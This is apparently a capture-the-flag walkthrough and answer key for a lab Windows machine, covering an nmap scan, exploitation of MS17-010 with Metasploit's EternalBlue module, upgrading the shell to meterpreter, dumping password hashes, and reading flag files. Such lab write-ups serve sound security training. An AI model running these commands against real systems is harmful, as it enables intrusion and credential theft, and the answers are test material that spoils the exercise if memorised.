#Task 1 Recon 
- How many ports are open with a port number under 1000?
hint: nmap -sC -sV -Pn -vv --script=vuln $IP
3

- What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
ms17-010


# Task 2 Gain Access 
- Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
hint: msf6>search ms17
exploit/windows/smb/ms17_010_eternalblue

- Show options and set the one required value. What is the name of this value? (All caps for submission)
hint: mfs6>show options
rhosts


#Task 3 Escalate 
- If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
hint: msf6>search shell_to_meterpreter
post/multi/manage/shell_to_meterpreter


- Select this (use MODULE_PATH). Show options, what option are we required to change?
SESSION


#Task 4 Cracking

hint: meterpreter>hashdump

#Task 5 Find flags! 
- Flag1? This flag can be found at the system root. 
hint: meterpreter> cd c:/
dir
cat flag1.txt
flag{access_the_machine}


- Flag2? This flag can be found at the location where passwords are stored within Windows.
hint: cat c:\Windows\System32\config\flag2.txt
flag{sam_database_elevated_access}


- flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
hint:meterpreter>cd c:/Users/Jon/Documents
cat flag3.txt
flag{admin_documents_can_be_valuable}
